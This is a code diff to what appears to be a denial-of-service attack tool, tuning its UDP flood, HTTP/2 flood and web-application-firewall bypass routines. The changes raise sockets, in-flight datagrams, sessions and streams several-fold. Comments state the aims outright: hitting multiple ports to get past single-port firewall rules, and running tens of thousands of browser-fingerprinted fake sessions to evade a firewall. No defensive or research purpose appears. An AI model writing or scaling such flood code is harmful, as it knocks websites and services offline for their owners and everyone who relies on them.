@@ -191,9 +191,9 @@ async function runUDPFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  // CRITICAL: max 8 sockets — more than 8 causes deadlock in this environment
-  // Sockets must start SEQUENTIALLY (bind → sendNext → next socket), then run in parallel
-  const numSockets = Math.max(1, Math.min(threads, 8));
+  // Sockets start SEQUENTIALLY (bind → sendNext → then next socket) to prevent bind() race.
+  // Once all bound, they all fire in parallel. Up to 32 sockets on 8vCPU deployment.
+  const numSockets = Math.max(1, Math.min(threads, 32));
   // Hit multiple ports to bypass single-port firewall rules
   const PORTS = [
     targetPort, targetPort, targetPort, // weight target port 3x
@@ -205,7 +205,7 @@ async function runUDPFlood(
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const MAX_INFLIGHT = 150; // per socket — proven stable limit
+  const MAX_INFLIGHT = Math.min(threads * 10, 400); // 32GB: up to 400 inflight datagrams per socket
 
   const socketDonePromises: Promise<void>[] = [];
 
@@ -643,8 +643,10 @@ async function runHTTP2Flood(
 ): Promise<void> {
   const { connect: h2connect, constants: h2constants } = await import("node:http2");
 
-  const STREAMS_PER_SESSION = Math.min(128, Math.max(16, threads * 3));
-  const NUM_SESSIONS        = Math.min(threads, 40);
+  // 32GB RAM / 8 vCPU optimized: 5× more sessions, 2× burst size per session
+  // Each H2 session: ~80KB V8 + TLS state — 200 sessions = ~16MB, trivial on 32GB
+  const STREAMS_PER_SESSION = Math.min(256, Math.max(32, threads * 3));
+  const NUM_SESSIONS        = Math.min(threads, 200);
   const connectTarget       = `https://${resolvedHost}:${targetPort}`;
 
   let localPkts = 0, localBytes = 0;
@@ -1059,8 +1061,10 @@ async function runWAFBypass(
   const resolvedIp = await resolveHost(hostname).catch(() => hostname);
   const target     = `https://${resolvedIp}:${tgtPort}`;
 
-  const NUM_SESSIONS     = Math.min(threads * 2, 80);
-  const STREAMS_PER      = Math.min(64, Math.max(8, threads));
+  // 32GB RAM optimized: 5× more sessions (400 vs 80), 2× concurrent streams (128 vs 64)
+  // 400 Chrome-fingerprinted sessions × 128 streams = 51,200 concurrent fake browsers
+  const NUM_SESSIONS     = Math.min(threads * 2, 400);
+  const STREAMS_PER      = Math.min(128, Math.max(16, threads));
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
